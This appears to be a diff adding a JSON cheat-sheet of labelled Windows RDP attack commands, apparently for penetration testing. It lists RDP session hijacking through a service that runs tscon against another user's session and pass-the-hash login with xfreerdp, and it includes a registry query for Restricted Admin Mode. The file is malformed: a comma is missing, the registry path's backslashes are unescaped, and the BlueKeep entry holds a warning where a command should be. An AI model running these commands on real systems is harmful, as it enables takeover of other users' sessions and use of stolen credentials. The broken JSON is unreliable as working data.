@@ -1,0 +1,26 @@
+[
+  {
+    "text": "Session Hijack: See active sessions",
+    "cmd": "query user"
+  },
+  {
+    "text": "Session Hijack: Create scheduled task",
+    "cmd": "sc.exe create sessionhijack binpath= \"cmd.exe /k tscon TARGET_SESSION_ID /dest:OUR_SESSION_NAME\""
+  },
+  {
+    "text": "Session Hijack: Run the task",
+    "cmd": "net start sessionhijack"
+  },
+  {
+    "text": "PTH: Check if Restricted Admin Mode is enabled",
+    "cmd": "reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin"
+  }
+  {
+    "text": "PTH: Pass the Hash",
+    "cmd": "xfreerdp /v:TARGET_IP /u:USER /pth:HASH"
+  },
+  {
+    "text": "BlueKeep: Check if Windows version is vulnerable",
+    "cmd": "WARNING: This may cause BSOD"
+  }
+]
